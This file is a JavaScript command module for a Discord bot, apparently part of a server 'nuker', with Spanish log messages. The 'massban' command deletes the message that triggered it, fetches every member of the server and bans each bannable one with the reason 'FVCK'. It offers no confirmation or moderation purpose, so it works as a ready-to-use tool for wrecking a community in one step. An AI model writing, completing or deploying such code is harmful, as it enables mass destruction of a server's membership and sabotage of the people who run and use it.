require('discord.js');
require('colors');

module.exports = {
    name: 'massban',

    async execute(client, message) {
        await message.delete();
        console.log(" [+] ".green + ` Baneando: ${message.guild.memberCount} miembros.`);
        message.guild.members.fetch().then((members) => {
            members.forEach((member) => {
                try {
                    if (member.bannable) {
                        member.ban({ reason: "FVCK" });
                    }
                } catch {
                    return;
                }
            });
        });
        console.log(" [+] ".green + ` Han quedado: ${message.guild.memberCount} miembros restantes.`);
    }
}